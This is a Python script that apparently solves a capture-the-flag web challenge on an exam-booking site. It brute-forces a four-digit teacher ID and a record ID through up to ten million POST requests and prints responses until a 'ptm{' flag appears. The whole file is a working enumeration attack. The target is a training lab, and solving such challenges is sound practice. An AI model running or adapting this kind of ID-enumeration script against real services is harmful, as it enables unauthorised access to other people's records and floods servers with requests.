import requests
import json

site = "http://exambooking.challs.olicyber.it/bakand"

headers = {
    "Host": "exambooking.challs.olicyber.it",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:144.0) Gecko/20100101 Firefox/144.0",
    "Accept": "*/*",
    "Accept-Language": "it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3",
    "Accept-Encoding": "gzip, deflate",
    "Referer": "http://exambooking.challs.olicyber.it/",
    "Origin": "http://exambooking.challs.olicyber.it",
    "Connection": "keep-alive",
    "Cookie": "/=",
    "Content-Type": "application/json",
    "Priority": "u=0",
    "Pragma": "no-cache",
    "Cache-Control": "no-cache"
}

base_data = {
    "aula":"AULA VIRTUALE",
    "cod_ins":"01ELEET",
    "d_fin_appel":"",
    "d_ini_appel":"",
    "data_appello":"2021-07-05",
    "data_ora_appello":"05-07-2021 17:00",
    "desc_tipo":"Esami scritti a risposta aperta o chiusa tramite PC",
    "docente":"ROBOT MR",
    "frequenza":2021,
    "mat_docente":"0000",    # sarà ciclato
    "nome_insegnamento":"Hacktivism ",
    "note":"Please be advised that to take the test you need your credential for the PORTALE DELLA DIDATTICA. In the REMOTE EXAMS part you will find the link to the test. At the begging of the test, following respondus instructions, you must show a valid photo ID to the webcam in such a way that it can be read.",
    "posti_liberi":999,
    "id_verbale":0            # sarà ciclato
}

for m in range(10000):
    for v in range(1000):
        base_data["mat_docente"] = f"{m:04d}"
        base_data["id_verbale"] = v
        r = requests.post(site, data=json.dumps(base_data), headers=headers)
        print(f"TENT {base_data['mat_docente']}-{v} => {r.status_code}\n{r.text}\n{'-'*50}")
        if "ptm{" in r.text:
            print("FLAG TROVATA:", [line for line in r.text.splitlines() if "ptm{" in line][0])
            raise SystemExit
